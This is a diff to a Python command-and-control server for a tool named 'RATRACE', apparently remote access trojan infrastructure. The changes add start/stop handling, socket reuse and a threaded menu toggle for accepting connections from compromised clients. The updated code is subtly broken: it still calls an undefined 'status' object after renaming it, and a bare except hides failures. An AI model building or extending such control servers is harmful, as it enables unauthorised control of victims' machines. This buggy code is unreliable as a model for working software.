@@ -8,18 +8,33 @@ class C2Server:
 		self.port = port
 		self.clients = []
 		self.current_client_index = 0
+		self.running = True
+		self.server = None
+		self.listening = None
 
 	def start(self):
+		if self.server:
+			self.server.close()
 		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.server.bind((self.host, self.port))
+		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
 		self.server.listen(10)
-		status = log.waitfor(f"{self.host}:{self.port} Status", status = 'Listening')
+		self.listening = log.waitfor(f"{self.host}:{self.port} Status", status = 'Listening')
 
-		while True:
-			client_socket, addr = self.server.accept()
-			log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
-			status.success()
-			self.clients.append(client_socket)
+		while self.running:
+			try:
+				client_socket, addr = self.server.accept()
+				log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
+				status.success()
+				self.clients.append(client_socket)
+			except:
+				break
+
+	def stop(self):
+		self.running = False
+		self.listening.success()
+		self.server.close()
 
 	def select_client(self):
 		if not self.clients:
@@ -48,15 +63,23 @@ class C2Server:
 
 if __name__ == "__main__":
 	items = ["Start Server","option2", "option3"]
+	running = False
+	server = C2Server()
+	server_thread = None
 	while True:
 		choice = options('Welcome to RATRACE - Make your Selection', items)
 		if choice == 0:
-			server = C2Server()
-			# Start server in separate thread
-			server_thread = threading.Thread(target=server.start)
-			server_thread.daemon = True
-			server_thread.start()
-			items[0] = "Stop Server"
+			if not running:
+				server.running = True
+				server_thread = threading.Thread(target=server.start)
+				server_thread.daemon = True
+				server_thread.start()
+				items[0] = "Stop Server"
+				running = True
+			elif running:
+				server.stop()
+				items[0] = "Start Server"
+				running = False
 
 		#command = str_input('C2> ')
 		#server.send_command(command)
